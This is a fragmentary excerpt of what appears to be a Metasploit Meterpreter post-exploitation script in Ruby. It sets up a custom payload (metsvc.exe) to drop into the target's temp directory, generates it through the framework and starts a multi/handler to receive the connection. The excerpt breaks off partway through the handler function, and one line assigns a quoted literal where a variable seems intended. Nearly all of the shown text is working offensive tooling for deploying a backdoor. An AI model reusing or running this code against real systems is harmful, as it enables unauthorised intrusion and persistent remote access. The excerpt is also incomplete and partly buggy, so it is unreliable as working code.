...
altexe = nil
target_dir = "%temp%\\"
payload_type = "generic/custom"
payloadfile = "/var/www/html/metsvc.exe"
script = nil
script_on_target = nil

@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "This help menu"],
  "-K"  => [ true,   "Location of custom payload file"],
...
#-------------------------------------------------------------------------------
def create_payload(payload_type,payloadfile)
  print_status("Creating Payload=#{payload_type} PAYLOADFILE=#{payloadfile}")
  payload = payload_type
  pay = client.framework.payloads.create(payload)
  pay.datastore['PAYLOADFILE'] = payloadfile
  return pay.generate
end
...
#-------------------------------------------------------------------------------
def set_handler(selected_payload,payloadfile)
  print_status("Starting connection handler at ")
  mul = client.framework.exploits.create("multi/handler")
  mul.datastore['WORKSPACE'] = @client.workspace
  mul.datastore['PAYLOAD']   = selected_payload
  mul.datastore['PAYLOADFILE']  = 'payloadfile'
